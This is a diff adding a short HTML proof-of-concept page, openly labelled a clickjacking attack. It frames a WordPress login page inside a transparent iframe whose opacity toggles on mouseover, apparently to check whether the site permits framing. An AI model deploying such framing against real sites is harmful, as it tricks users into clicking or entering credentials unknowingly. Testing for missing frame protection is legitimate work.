@@ -1,0 +1,13 @@
+<html>
+<body>
+<h1>hacker says:</h1><br>
+<h2>This is a ClickJacking attack!</h2><br>
+You are now accessing web page under a frame !<br><br>
+
+<iframe src="https://example.co.il/wp-login.php" 
+	name=Frame2 style="opacity:0.;filter:alpha(opacity=40); position: absolute; left: 0px;  top:190px; " 
+	width="60%" height="60%" onmouseover="this.style.opacity=0.5;this.filters.alpha.opacity=50" 
+	onmouseout="this.style.opacity=0;this.filters.alpha.opacity=0"/>
+
+  </body>
+</html>
